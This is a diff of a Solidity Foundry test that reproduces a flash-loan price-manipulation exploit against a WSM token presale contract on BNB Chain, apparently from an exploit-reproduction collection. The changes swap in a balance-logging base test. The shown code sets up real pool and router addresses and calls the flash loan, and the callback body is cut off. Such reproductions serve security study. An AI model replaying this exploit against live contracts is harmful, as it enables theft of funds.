@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "./../interface.sol";
 
 
@@ -16,7 +16,7 @@ import "./../interface.sol";
 // Using a flash loan to cause price disparity in the BNB_WSM pool, 
 // and then manipulating the price through the buyWithBNB() in the presale contract.
 
-contract WSM is Test{
+contract WSM is BaseTestWithBalanceLog {
     
     Uni_Pair_V3 BNB_WSH_10000 = Uni_Pair_V3(payable(address(0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E)));
     Uni_Router_V3 routerv3_ = Uni_Router_V3(payable(address(0x74Dca1Bd946b9472B2369E11bC0E5603126E4C18)));
@@ -33,12 +33,11 @@ contract WSM is Test{
 
         wshToken_.approve(address(routerv3_), 10000000000000 ether);
         bnbToken_.approve(address(routerv3_), 10000000000000 ether);
+        fundingToken = address(wshToken_);
     }
 
-    function testExploit() public{
-        console.log("1. before attack wsh token balance of this = ", wshToken_.balanceOf(address(this)));
+    function testExploit() public balanceLog{
         BNB_WSH_10000.flash(address(this), 5000000 ether, 0, "");
-        console.log("8. after attack wsh token balance of this = ", wshToken_.balanceOf(address(this)));
     }
 
     function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public{
